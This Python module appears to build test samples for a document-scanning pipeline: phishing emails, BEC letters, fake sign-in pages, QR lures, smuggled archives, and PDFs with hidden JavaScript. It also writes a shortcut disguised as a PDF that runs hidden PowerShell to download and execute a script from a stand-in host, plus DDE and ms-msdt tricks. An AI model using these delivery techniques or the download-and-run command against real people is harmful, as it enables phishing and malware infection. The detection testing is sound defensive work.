# hal-id: #HAL-20261110-0007-PK-R5
"""Generate BENIGN test samples for the safe-render pipeline (run inside the container).

  python -m saferender.make_samples /out
Every URL uses the reserved .example TLD (RFC 2606) and every phone number the fictional 555-01xx range.
Nothing here is malware; the "disguised exe" is just the two bytes "MZ" plus text and cannot run.
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
from pathlib import Path

import qrcode
from PIL import Image, ImageDraw, ImageFont

from .formats import LO_PROFILE_XCU

FONT = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
PAGES = 24
HIDDEN = "https://login-micros0ft-support.example/verify?id=7731"
DECEPTIVE_SHOWN, DECEPTIVE_REAL = "https://www.contoso.com/billing", "https://payments-portal.example/contoso/billing"
SCANNED = "https://overdue-billing.example/pay"
QR = "https://quish-test.example/login"
PHONE = "(800) 555-0143"
SHOWN_MS = "https://account.microsoft.com/security"
MFA_QR = "https://mfa-reverify.example/start"
SEC_PHONE = "(800) 555-0177"
BEC_PHONE = "(800) 555-0187"
VM_PHONE = "+1 (800) 555-0199"
VM_URL = "https://vm-listen.example/play"
FILLER = ("This section summarizes vendor performance for the quarter, including delivery timeliness, invoice "
          "accuracy and service-level adherence. Figures are illustrative test content only. ") * 6


def scanned_png(path: Path) -> None:
    """An image-only 'scan': the URL exists only as pixels, so only OCR can find it."""
    img = Image.new("RGB", (1400, 500), "white")
    d = ImageDraw.Draw(img)
    big, small = ImageFont.truetype(FONT, 44), ImageFont.truetype(FONT, 34)
    d.text((60, 60), "FINAL NOTICE - ACCOUNT PAST DUE", font=big, fill="black")
    d.text((60, 170), "To avoid service interruption pay today at:", font=small, fill="black")
    d.text((60, 240), SCANNED, font=small, fill="black")
    d.text((60, 330), "Reference: TEST SAMPLE ONLY", font=small, fill="gray")
    img.save(path)


def qr_png(path: Path) -> None:
    qrcode.make(QR, box_size=10, border=4).save(path)


def soffice(src: Path, fmt: str, outdir: Path, infilter: str | None = None) -> None:
    profile = Path(tempfile.mkdtemp())
    (profile / "user").mkdir()
    (profile / "user" / "registrymodifications.xcu").write_text(LO_PROFILE_XCU)
    cmd = ["soffice", f"-env:UserInstallation=file://{profile}", "--headless", "--norestore"]
    if infilter:
        cmd.append(f"--infilter={infilter}")
    subprocess.run(cmd + ["--convert-to", fmt, "--outdir", str(outdir), str(src)], check=True, capture_output=True,
                   timeout=180, env={"HOME": str(profile), "PATH": "/usr/bin:/bin"})


def report_html(work: Path) -> Path:
    scanned_png(work / "scan.png")
    qr_png(work / "qr.png")
    parts = ["<html><body><h1>Quarterly Vendor Report (TEST SAMPLE)</h1><p>Prepared for Accounts Payable.</p>"]
    for n in range(2, PAGES + 1):
        body = f"<h2>Section {n - 1}</h2><p>{FILLER}</p>"
        if n == 5:
            body += f'<p>Your invoice is ready. <a href="{HIDDEN}">Click here to view your invoice</a>.</p>'
        if n == 7:
            body += f'<p>Billing portal: <a href="{DECEPTIVE_REAL}">{DECEPTIVE_SHOWN}</a></p>'
        if n == 11:
            body += '<p>Scanned notice attached below:</p><p><img src="scan.png" width="600"></p>'
        if n == 15:
            body += '<p>Scan to confirm your account:</p><p><img src="qr.png" width="220"></p>'
        if n == 19:
            body += f"<p>Questions about this renewal? Call our billing desk at {PHONE} to cancel.</p>"
        parts.append(f'<p style="page-break-before: always"></p>{body}')
    parts.append("</body></html>")
    p = work / "long-report.html"
    p.write_text("".join(parts))
    return p


def voicemail_png(path: Path) -> None:
    """A screenshot-style lure: the number and URL exist only as pixels."""
    img = Image.new("RGB", (1200, 420), (245, 247, 250))
    d = ImageDraw.Draw(img)
    big, small = ImageFont.truetype(FONT, 42), ImageFont.truetype(FONT, 32)
    d.text((50, 50), "New voicemail (0:42) - TEST SAMPLE", font=big, fill="black")
    d.text((50, 150), f"From: {VM_PHONE}", font=small, fill="black")
    d.text((50, 220), f"Listen here: {VM_URL}", font=small, fill="black")
    d.text((50, 300), "Expires in 24 hours", font=small, fill=(180, 0, 0))
    img.save(path)


def preview_set(out: Path, work: Path) -> None:
    """Everyday-looking lures for demos: a forwarded phishing email, a BEC letter, an HTML login page,
    a voicemail screenshot, and a clean spreadsheet. All benign."""
    from email.message import EmailMessage

    # 1. Forwarded phishing email: spoofed display name, lookalike domain, failed auth, deceptive link,
    #    an inline QR image and an attached PDF with a callback number.
    rep = work / "Security-Report.html"
    rep.write_text("<html><body><h1>Microsoft 365 Security Report (TEST SAMPLE)</h1>"
                   "<p>We blocked 3 sign-in attempts on your account.</p>"
                   f"<p>If this wasn't you, call the security desk now at {SEC_PHONE}.</p></body></html>")
    soffice(rep, "pdf:writer_pdf_Export", work, "HTML (StarWriter)")
    qr = work / "qr-mfa.png"
    qrcode.make(MFA_QR, box_size=8, border=4).save(qr)
    msg = EmailMessage()
    msg["From"] = '"Microsoft 365 Security" <no-reply@micros0ft-alerts.example>'
    msg["Reply-To"] = "helpdesk@quick-support.example"
    msg["To"] = "analyst@contoso.com"
    msg["Subject"] = "Action required: unusual sign-in activity (TEST SAMPLE)"
    msg["Date"] = "Tue, 10 Nov 2026 08:14:00 -0800"
    msg["Message-ID"] = "<test-sample-0001@micros0ft-alerts.example>"
    msg["Authentication-Results"] = "mx.contoso.com; spf=fail smtp.mailfrom=micros0ft-alerts.example; dkim=none; dmarc=fail"
    msg.set_content("We detected an unusual sign-in. Review it at https://micros0ft-alerts.example/review "
                    "or scan the code. TEST SAMPLE ONLY.")
    msg.add_alternative(
        "<html><body><p>We detected an unusual sign-in to your account.</p>"
        f'<p><a href="https://micros0ft-alerts.example/review?u=analyst">{SHOWN_MS}</a></p>'
        '<p>Or scan to re-verify MFA:</p><p><img src="cid:qr1"></p>'
        "<p>TEST SAMPLE ONLY.</p></body></html>", subtype="html")
    msg.get_payload()[1].add_related(qr.read_bytes(), "image", "png", cid="<qr1>", filename="qr-mfa.png")
    msg.add_attachment((work / "Security-Report.pdf").read_bytes(), maintype="application", subtype="pdf",
                       filename="Security-Report.pdf")
    (out / "fwd-account-alert.eml").write_bytes(bytes(msg))

    # 2. BEC: a plain letter asking to change bank details. No links, no macros: the content IS the threat.
    bec = work / "vendor-bank-change.html"
    bec.write_text("<html><body><h2>Northwind Supplies (TEST SAMPLE)</h2><p>Dear Accounts Payable,</p>"
                   "<p>Please note our banking details have changed effective immediately. All open invoices "
                   "should be remitted to our new account below. Our old account is under audit and payments "
                   "sent there will be returned.</p><p>Bank: Example Federal Bank<br>Routing: 000000000 (TEST)<br>"
                   f"Account: 0000000000 (TEST)</p><p>To confirm, call our controller directly at {BEC_PHONE}. "
                   "Please do not use the number on file.</p><p>Regards,<br>J. Smith, Controller</p></body></html>")
    soffice(bec, "docx:MS Word 2007 XML", out, "HTML (StarWriter)")

    # 3. HTML attachment that is a fake sign-in page (password field, posts to a lookalike).
    (out / "shared-document.html").write_text(
        "<html><head><title>DocuSign - Review Document</title></head><body>"
        "<h2>DocuSign</h2><p>You have a document to review. Sign in to continue. TEST SAMPLE ONLY.</p>"
        '<form action="https://docusign-secure-view.example/submit" method="post">'
        '<input name="email" type="email"><input name="pw" type="password"><button>Sign in</button></form>'
        "</body></html>")

    # 4. Voicemail screenshot (OCR finds the number and the link).
    voicemail_png(out / "voicemail.png")

    # 6. Legit marketing mail: DKIM passes and every link runs through the sender's own click tracker.
    news = EmailMessage()
    news["From"] = "Contoso Learning <news@mail.contoso.com>"
    news["To"] = "analyst@contoso.com"
    news["Subject"] = "Your course certificate is ready (TEST SAMPLE)"
    news["Authentication-Results"] = "mx.contoso.com; spf=pass; dkim=pass header.i=@mail.contoso.com; dmarc=pass"
    news.set_content("Your certificate is ready. TEST SAMPLE ONLY.")
    news.add_alternative('<html><body><p>Your certificate is ready.</p><p><a href="https://url1234.mail.contoso.com/'
                         'ls/click?upn=TEST">learn.contoso.com</a></p></body></html>', subtype="html")
    (out / "newsletter-tracked-links.eml").write_bytes(bytes(news))

    # 7. A small phone photo of a receipt (like real attachments): text is tiny until upscaled for OCR.
    img = Image.new("RGB", (480, 640), (236, 233, 226))
    d = ImageDraw.Draw(img)
    f13 = ImageFont.truetype(FONT, 13)
    for i, line in enumerate(["NORTHWIND CLINIC (TEST SAMPLE)", "Invoice 50834", "Ph: (707) 555-0136",
                              "Exam ............ $42.21", "Total ........... $42.21"]):
        d.text((40, 40 + i * 22), line, font=f13, fill=(40, 40, 40))
    # Stored upside down with EXIF Orientation=3, exactly like a phone photo taken "the wrong way up".
    exif = Image.Exif()
    exif[0x0112] = 3
    img.rotate(180).save(out / "receipt-photo.jpg", quality=80, exif=exif)

    # 5. A clean spreadsheet: the common case, which should come back NO DETECTIONS.
    csv = work / "timesheet.csv"
    csv.write_text("Employee,Mon,Tue,Wed,Thu,Fri,Total\nA. Analyst,8,8,8,8,8,40\nB. Analyst,8,8,7.5,8,8,39.5\n")
    soffice(csv, "xlsx:Calc MS Excel 2007 XML", out, "CSV:44,34,76,1")


# ---------------------------------------------------------------- depth samples (deep.py): hidden below layer one
OBJSTM_JS_URL = "https://objstm-hidden.example/pay"
OBJSTM_FORM_URL = "https://objstm-form.example/collect"
EMBEDDED_URL = "https://embedded-link.example/login"
SMUGGLED_ZIP_URL = "https://smuggled-zip.example/pay"
CHARCODE_URL = "https://charcode-hidden.example/next"
REVERSED_URL = "https://reversed-hidden.example/next"
TABLE_QR_URL = "https://table-qr.example/scan"
INVERTED_QR_URL = "https://inverted-qr.example/scan"


def objstm_pdf() -> bytes:
    """A PDF 1.5 whose catalog, page, JavaScript and SubmitForm actions all live inside ONE Flate-compressed object
    stream, with an xref stream. A raw-bytes search finds no /JavaScript, /OpenAction or /SubmitForm at all."""
    import zlib
    js = b'app.launchURL("ht" + "tps://objstm-hid" + "den.example/pay", true); // TEST SAMPLE'
    hidden = {
        1: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
           b"/Resources << /Font << /F1 6 0 R >> >> /AA << /O 7 0 R >> >>",
        5: b"<< /S /JavaScript /JS (" + js + b") >>",
        6: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        7: b"<< /S /SubmitForm /F << /FS /URL /F (" + OBJSTM_FORM_URL.encode() + b") >> >>",
    }
    head, body = [], b""
    for num, obj in hidden.items():
        head.append(f"{num} {len(body)}")
        body += obj + b"\n"
    header = (" ".join(head) + "\n").encode()
    stm = zlib.compress(header + body)
    text = zlib.compress(b"BT /F1 20 Tf 72 700 Td (Account statement - TEST SAMPLE) Tj ET")
    out, offsets = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"), {}

    def obj(num: int, data: bytes) -> None:
        offsets[num] = len(out)
        out.extend(f"{num} 0 obj\n".encode() + data + b"\nendobj\n")

    obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    obj(4, f"<< /Length {len(text)} /Filter /FlateDecode >>\nstream\n".encode() + text + b"\nendstream")
    obj(8, f"<< /Type /ObjStm /N {len(hidden)} /First {len(header)} /Length {len(stm)} /Filter /FlateDecode >>"
           "\nstream\n".encode() + stm + b"\nendstream")
    offsets[9] = len(out)
    rows = [b"\x00" + (0).to_bytes(4, "big") + (65535).to_bytes(2, "big")]
    index = {n: i for i, n in enumerate(hidden)}
    for n in range(1, 10):
        if n in index:
            rows.append(b"\x02" + (8).to_bytes(4, "big") + index[n].to_bytes(2, "big"))
        else:
            rows.append(b"\x01" + offsets[n].to_bytes(4, "big") + (0).to_bytes(2, "big"))
    xref = b"".join(rows)
    out.extend(f"9 0 obj\n<< /Type /XRef /Size 10 /W [1 4 2] /Root 1 0 R /Length {len(xref)} >>\nstream\n".encode()
               + xref + b"\nendstream\nendobj\n")
    out.extend(f"startxref\n{offsets[9]}\n%%EOF\n".encode())
    return bytes(out)


def depth_set(out: Path) -> None:
    import base64
    import io
    import zipfile

    import pypdf

    # 1. Active content hidden in a compressed object stream (JavaScript that opens a link + a form that posts out).
    (out / "statement-objstm.pdf").write_bytes(objstm_pdf())

    # 2. A PDF that carries another file inside it; the inner file holds the real link.
    w = pypdf.PdfWriter()
    w.add_blank_page(612, 792)
    w.add_attachment("invoice-details.html", f'<html><body><p>TEST SAMPLE</p><a href="{EMBEDDED_URL}">View invoice'
                                             "</a></body></html>".encode())
    with open(out / "statement-embedded.pdf", "wb") as fh:
        w.write(fh)

    # 3. HTML smuggling: a zip assembled in the browser from base64, plus links built from char codes / reversed text.
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("readme.txt", f"TEST SAMPLE. Pay at {SMUGGLED_ZIP_URL}\n")
    b64 = base64.b64encode(buf.getvalue()).decode()
    codes = ",".join(str(ord(c)) for c in CHARCODE_URL)
    (out / "smuggle-invoice.html").write_text(
        "<html><body><p>Your invoice is downloading... TEST SAMPLE ONLY.</p><script>\n"
        f'var d = atob("{b64}");\n'
        "var b = new Uint8Array(d.length); for (var i = 0; i < d.length; i++) b[i] = d.charCodeAt(i);\n"
        'var a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([b]));\n'
        'a.download = "invoice-7731.zip";\n'
        f"var next = String.fromCharCode({codes});\n"
        f'var back = "{REVERSED_URL[::-1]}".split("").reverse().join("");\n'
        "</script></body></html>")

    # 4. A QR code drawn as an HTML table (no image anywhere): only a rendered picture of the page shows it.
    m = qrcode.QRCode(border=4)
    m.add_data(TABLE_QR_URL)
    m.make()
    rows = "".join("<tr>" + "".join(f'<td bgcolor="{"#000000" if c else "#ffffff"}" width="6" height="6"></td>'
                                    for c in row) + "</tr>" for row in m.get_matrix())
    (out / "qr-table.html").write_text('<html><body><p>Scan to pay. TEST SAMPLE ONLY.</p>'
                                       f'<table cellspacing="0" cellpadding="0" border="0">{rows}</table>'
                                       "</body></html>")

    # 5. A page that tries to pull files from inside the renderer into the picture (must be stripped before drawing).
    (out / "local-file-probe.html").write_text(
        '<html><body><p>Local file probe. TEST SAMPLE ONLY.</p><img src="file:///usr/share/pixmaps/debian-logo.png">'
        '<iframe src="file:///etc/os-release"></iframe></body></html>')

    # 6. A light-on-dark (inverted) QR code in an image.
    img = qrcode.make(INVERTED_QR_URL, box_size=8, border=4).convert("L")
    Image.eval(img, lambda v: 255 - v).save(out / "qr-inverted.png")


# ---------------------------------------------------------------- tier 2 samples: archives, disk images, passwords
PW = "4471"
PW_AES_URL = "https://pw-aes-zip.example/pay"
PW_7Z_URL = "https://pw-7z.example/pay"
PW_PDF_URL = "https://pw-pdf.example/view"
ISO_URL = "https://iso-inside.example/open"
TARGZ_URL = "https://targz-inside.example/report"
CHAIN_URL = "https://chain-iso.example/next"


def _page(path: Path, url: str) -> Path:
    path.write_text(f'<html><body><p>TEST SAMPLE</p><a href="{url}">Open document</a></body></html>')
    return path


def tier2_set(out: Path, work: Path) -> None:
    import io
    import tarfile
    from email.message import EmailMessage

    import pypdf
    from pypdf.annotations import Link

    t2 = work / "t2"
    t2.mkdir()
    run = lambda *cmd: subprocess.run(cmd, check=True, capture_output=True, cwd=t2)  # noqa: E731
    # Locked attachments + the password in the email: the classic way past email gateways.
    run("7zz", "a", "-tzip", f"-p{PW}", "-mem=AES256", "docs-aes.zip", _page(t2 / "pay-aes.html", PW_AES_URL).name)
    run("7zz", "a", "-t7z", f"-p{PW}", "-mhe=on", "docs-hidden-names.7z", _page(t2 / "pay-7z.html", PW_7Z_URL).name)
    w = pypdf.PdfWriter()
    w.add_blank_page(612, 792)
    w.add_annotation(0, Link(rect=(72, 600, 300, 640), url=PW_PDF_URL))
    w.encrypt(PW)
    pdf = io.BytesIO()
    w.write(pdf)
    msg = EmailMessage()
    msg["From"] = "Accounts <billing@vendor-docs.example>"
    msg["To"] = "analyst@contoso.com"
    msg["Subject"] = "Your documents (TEST SAMPLE)"
    msg.set_content(f"Your documents are attached. The password is {PW}\nTEST SAMPLE ONLY.")
    for name in ("docs-aes.zip", "docs-hidden-names.7z"):
        msg.add_attachment((t2 / name).read_bytes(), maintype="application", subtype="octet-stream", filename=name)
    msg.add_attachment(pdf.getvalue(), maintype="application", subtype="pdf", filename="statement-locked.pdf")
    (out / "documents-locked.eml").write_bytes(bytes(msg))

    # A zip whose password appears nowhere: must be reported, not silently skipped.
    run("7zz", "a", "-tzip", "-pNotInTheEmail-93", "locked-unknown.zip", _page(t2 / "secret.html", PW_AES_URL).name)
    (out / "locked-unknown.zip").write_bytes((t2 / "locked-unknown.zip").read_bytes())

    # A disk image (ISO) with a document inside.
    iso_dir = t2 / "iso"
    iso_dir.mkdir()
    _page(iso_dir / "readme.html", ISO_URL)
    run("bsdtar", "--format", "iso9660", "-cf", str(out / "shipping-docs.iso"), "-C", str(iso_dir), ".")

    # gzip > tar > file.
    _page(t2 / "report.html", TARGZ_URL)
    with tarfile.open(out / "report.tar.gz", "w:gz") as tf:
        tf.add(t2 / "report.html", arcname="report/report.html")

    # The classic delivery chain: zip > ISO > file.
    chain = t2 / "chain"
    chain.mkdir()
    _page(chain / "note.html", CHAIN_URL)
    run("bsdtar", "--format", "iso9660", "-cf", str(t2 / "statement.iso"), "-C", str(chain), ".")
    run("7zz", "a", "-tzip", str(out / "delivery.zip"), str(t2 / "statement.iso"))


# ---------------------------------------------------------------- tier 2b: .msg, .lnk, OneNote, Office tricks
def cfb(files: dict[str, bytes]) -> bytes:
    """Minimal Compound File Binary (v3) writer, for TEST SAMPLES only (.msg and OLE packages; no free tool writes
    them). files: {"storage/stream": data}. Small streams go in the mini stream, as the spec requires."""
    import struct
    END, FREE, FATSECT, NOSTREAM = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFF
    nodes = [{"name": "Root Entry", "type": 5, "kids": [], "data": b""}]
    index = {"": 0}
    for path in sorted(files):
        parts = path.split("/")
        for i in range(1, len(parts) + 1):
            key = "/".join(parts[:i])
            if key not in index:
                index[key] = len(nodes)
                last = i == len(parts)
                nodes.append({"name": parts[i - 1], "type": 2 if last else 1, "kids": [],
                              "data": files[path] if last else b""})
                nodes[index["/".join(parts[:i - 1])]]["kids"].append(index[key])
    sectors, fat = [], []

    def put(data: bytes, size: int = 512) -> int:
        """Append data as a chain of sectors (regular: list `sectors`); return the first sector id."""
        n = max(1, -(-len(data) // size))
        start = len(sectors)
        for i in range(n):
            sectors.append(data[i * size:(i + 1) * size].ljust(size, b"\0"))
            fat.append(start + i + 1 if i < n - 1 else END)
        return start

    mini, minifat = bytearray(), []
    for nd in nodes:
        if nd["type"] == 2 and len(nd["data"]) < 4096:
            nd["start"] = len(mini) // 64 if nd["data"] else END
            n = -(-len(nd["data"]) // 64)
            for i in range(n):
                minifat.append(nd["start"] + i + 1 if i < n - 1 else END)
            mini += nd["data"].ljust(n * 64, b"\0")
        elif nd["type"] == 2:
            nd["start"] = put(nd["data"])
    nodes[0]["start"] = put(bytes(mini)) if mini else END
    nodes[0]["size"] = len(mini)
    minifat_start = put(b"".join(struct.pack("<I", x) for x in minifat)) if minifat else END
    n_minifat = -(-len(minifat) * 4 // 512)
    for nd in nodes:  # siblings: sorted, chained through the right pointer (a valid, if unbalanced, tree)
        nd.setdefault("left", NOSTREAM), nd.setdefault("right", NOSTREAM), nd.setdefault("child", NOSTREAM)
        kids = sorted(nd["kids"], key=lambda k: (len(nodes[k]["name"]), nodes[k]["name"].upper()))
        if kids:
            nd["child"] = kids[0]
            for a, b in zip(kids, kids[1:]):
                nodes[a]["right"] = b
    dirs = b""
    for nd in nodes:
        name = nd["name"].encode("utf-16-le") + b"\0\0"
        size = nd.get("size", len(nd["data"])) if nd["type"] != 1 else 0
        dirs += (name.ljust(64, b"\0") + struct.pack("<HBB3I", len(name), nd["type"], 1, nd["left"], nd["right"],
                                                     nd["child"]) + b"\0" * 36
                 + struct.pack("<IQ", nd.get("start", 0) if nd["type"] != 1 else 0, size))
    dirs += (b"\0" * 64 + struct.pack("<HBB3I", 0, 0, 0, NOSTREAM, NOSTREAM, NOSTREAM) + b"\0" * 48) * (-len(nodes) % 4)
    dir_start = put(dirs)
    n_fat = 1
    while (len(sectors) + n_fat) > n_fat * 128:
        n_fat += 1
    fat_ids = list(range(len(sectors), len(sectors) + n_fat))
    fat += [FATSECT] * n_fat
    fat += [FREE] * (n_fat * 128 - len(fat))
    for i in range(n_fat):
        sectors.append(b"".join(struct.pack("<I", x) for x in fat[i * 128:(i + 1) * 128]))
    header = (bytes.fromhex("d0cf11e0a1b11ae1") + b"\0" * 16 + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6)
              + b"\0" * 6 + struct.pack("<IIIIIIIII", 0, n_fat, dir_start, 0, 4096, minifat_start, n_minifat, END, 0)
              + b"".join(struct.pack("<I", x) for x in (fat_ids + [FREE] * (109 - n_fat))))
    return header + b"".join(sectors)


MSG_BODY_URL = "https://msg-body.example/login"
MSG_ATTACH_URL = "https://msg-attach.example/pay"
OLEPKG_URL = "https://olepkg-inside.example/run"
LNK_URL = "https://lnk-payload.example/a.ps1"
ONENOTE_URL = "https://onenote-hta.example/run"


def _docx(document_xml: str, extra: dict[str, bytes] | None = None, rels: str = "") -> bytes:
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
                   'content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.'
                   'relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension='
                   '"bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/><Override PartName='
                   '"/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.'
                   'document.main+xml"/></Types>')
        z.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.'
                   'openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
                   'openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                   '</Relationships>')
        z.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.'
                   f'openxmlformats.org/wordprocessingml/2006/main"><w:body>{document_xml}</w:body></w:document>')
        if rels:
            z.writestr("word/_rels/document.xml.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns='
                       f'"http://schemas.openxmlformats.org/package/2006/relationships">{rels}</Relationships>')
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return buf.getvalue()


def _lnk(target: str, args: str, icon: str) -> bytes:
    import struct
    flags = 0x4 | 0x8 | 0x20 | 0x40 | 0x80  # HasName, HasRelativePath, HasArguments, HasIconLocation, IsUnicode
    header = (struct.pack("<I", 0x4C) + bytes.fromhex("0114020000000000c000000000000046")
              + struct.pack("<II", flags, 0x20) + b"\0" * 24 + struct.pack("<IiIHHII", 0, 0, 7, 0, 0, 0, 0))
    sd = b"".join(struct.pack("<H", len(t)) + t.encode("utf-16-le") for t in ("Invoice (TEST SAMPLE)", target, args, icon))
    return header + sd + b"\0\0\0\0"


def tier2b_set(out: Path) -> None:
    import base64
    import struct

    # Outlook .msg: spoofed sender in the original headers, a link in the body, an HTML attachment with a link.
    u16 = lambda t: t.encode("utf-16-le")  # noqa: E731
    att = "__attach_version1.0_#00000000/"
    (out / "account-alert.msg").write_bytes(cfb({
        "__properties_version1.0": b"\0" * 32,
        "__substg1.0_0037001F": u16("Unusual sign-in activity (TEST SAMPLE)"),
        "__substg1.0_1000001F": u16(f"Review the sign-in at {MSG_BODY_URL} TEST SAMPLE ONLY."),
        "__substg1.0_007D001F": u16('From: "Microsoft 365 Security" <alerts@micros0ft-notice.example>\r\n'
                                    "To: analyst@contoso.com\r\nSubject: Unusual sign-in activity (TEST SAMPLE)\r\n"
                                    "Authentication-Results: mx.contoso.com; spf=fail; dkim=none; dmarc=fail\r\n"),
        att + "__properties_version1.0": b"\0" * 16,
        att + "__substg1.0_3707001F": u16("review.html"),
        att + "__substg1.0_37010102": f'<html><body><a href="{MSG_ATTACH_URL}">Review</a> TEST SAMPLE</body></html>'.encode(),
    }))

    # Shortcut disguised as a PDF: runs hidden PowerShell with a base64 (UTF-16) command that downloads a script.
    enc = base64.b64encode(f"iwr {LNK_URL} | iex  # TEST SAMPLE".encode("utf-16-le")).decode()
    (out / "Invoice-7731.pdf.lnk").write_bytes(_lnk(
        r"..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"-w hidden -nop -enc {enc}",
        r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"))

    # Word document with an embedded file (OLE package) whose content holds a link, plus a DDE field.
    payload = f'@echo off\r\nrem TEST SAMPLE\r\nstart "" "{OLEPKG_URL}"\r\n'.encode()
    native = (struct.pack("<H", 2) + b"invoice.bat\0" + b"C:\\Users\\x\\invoice.bat\0" + struct.pack("<II", 0, 0)
              + b"C:\\Users\\x\\AppData\\Local\\Temp\\invoice.bat\0" + struct.pack("<I", len(payload)) + payload)
    ole = cfb({"\x01Ole10Native": struct.pack("<I", len(native)) + native})
    (out / "contract-embedded.docx").write_bytes(_docx(
        "<w:p><w:r><w:t>Contract (TEST SAMPLE). Double-click the icon to view.</w:t></w:r></w:p>",
        {"word/embeddings/oleObject1.bin": ole}))
    (out / "memo-dde.docx").write_bytes(_docx(
        '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k echo TEST SAMPLE&quot; ">'
        "<w:r><w:t>Memo (TEST SAMPLE)</w:t></w:r></w:fldSimple></w:p>"))

    # Protocol-handler links: Follina-style ms-msdt and search-ms (opens an attacker's share as a "search").
    (out / "update-required.html").write_text(
        "<html><body><p>Update required. TEST SAMPLE ONLY.</p>"
        '<a href="search-ms:query=invoice&crumb=location:\\\\files.search-ms-test.example@SSL\\share">Open</a>'
        '<script>/* TEST SAMPLE */ var x = "ms-msdt:/id PCWDiagnostic /skip force /param IT_BrowseForFile=test";'
        "</script></body></html>")

    # OneNote section with an embedded HTA file (the "double-click to view" trick). Synthetic: only the container
    # structures the parser reads (section GUID + FileDataStoreObject), not a full OneNote file.
    hta = (f'<html><head><HTA:APPLICATION id="t"/></head><body>TEST SAMPLE<script>var u = "{ONENOTE_URL}";'
           "</script></body></html>").encode()
    one = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3").ljust(0x400, b"\0")
    one += (bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac") + struct.pack("<QIQ", len(hta), 0, 0) + hta
            + bytes.fromhex("22a7fb71795e4e4eaf4b5ac4fc4ed1da").ljust(16, b"\0"))
    (out / "shared-notes.one").write_bytes(one)

    # Pattern from a real 2026-11-18 phish: invisible characters in the subject, and one PDF attached twice, once
    # renamed .ics (a calendar invite) so filters that block PDFs let it through.
    from email.message import EmailMessage
    import pypdf as _pypdf
    import io as _io
    w = _pypdf.PdfWriter()
    w.add_blank_page(612, 792)
    pdf = _io.BytesIO()
    w.write(pdf)
    m = EmailMessage()
    m["From"] = "Service-Help <help@renamed-ics.example>"
    m["To"] = "analyst@contoso.com"
    m["Subject"] = "Re\u200bmin\u200bder: Com\U000e0139plete Your Info (TEST SAMPLE)"
    m.set_content("Please review the attached estimate. TEST SAMPLE ONLY.")
    m.add_attachment(pdf.getvalue(), maintype="application", subtype="pdf", filename="estimate.pdf")
    m.add_attachment(pdf.getvalue(), maintype="text", subtype="calendar", filename="estimate.ics")
    m.add_attachment(b"", maintype="application", subtype="octet-stream", filename="User Agreement")
    (out / "renamed-ics.eml").write_bytes(bytes(m))

    # Patterns from real 2026-11-18 phishing: a "Word document" that is only a reply-to address, and an attachment
    # that is nothing but base64 text (filler that makes the email look personal; here with a link inside).
    import base64 as _b64
    m = EmailMessage()
    m["From"] = "Order Desk <orders@reply-scam.example>"
    m["To"] = "analyst@contoso.com"
    m["Subject"] = "Your order (TEST SAMPLE)"
    m.set_content("Questions? See the attached document. TEST SAMPLE ONLY.")
    m.add_attachment(b"contact-desk@reply-scam.example", maintype="application", subtype="octet-stream",
                     filename="ATT00001.docx")
    filler = "TEST SAMPLE. Hey, how are you? Lovely weather today. Details: https://b64-filler.example/note\n" * 3
    m.add_attachment(_b64.b64encode(filler.encode()), maintype="application", subtype="octet-stream",
                     filename="note-1234.donconfig")
    (out / "text-disguises.eml").write_bytes(bytes(m))


def main(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    work = Path(tempfile.mkdtemp())
    html = report_html(work)
    soffice(html, "pdf:writer_pdf_Export", out, "HTML (StarWriter)")
    # A short Word doc whose only link hides behind "Click here" (target lives in the .rels, not the text).
    doc = work / "invoice-hidden-link.html"
    doc.write_text(f'<html><body><h1>Invoice 7731 (TEST SAMPLE)</h1><p>Your invoice is ready. '
                   f'<a href="{HIDDEN}">Click here</a> to view it.</p></body></html>')
    soffice(doc, "docx:MS Word 2007 XML", out, "HTML (StarWriter)")
    qr_png(out / "photo-qr.png")  # an image attachment that is only a QR code
    (out / "invoice.pdf").write_bytes(b"MZ" + b"\x00" * 62 + b"TEST SAMPLE: named .pdf, starts like an EXE. Not runnable.")
    (out / "update.js").write_text('// TEST SAMPLE: harmless text, never executed\n'
                                   'var u = "https://dl-test.example/payload.bin";\n'
                                   'WScript.Echo("this is a test sample: " + u);\n')
    preview_set(out, work)
    depth_set(out)
    tier2_set(out, work)
    tier2b_set(out)
    for p in sorted(out.iterdir()):
        print(f"{p.stat().st_size:>9}  {p.name}")


if __name__ == "__main__":
    main(Path(sys.argv[1] if len(sys.argv) > 1 else "/out"))
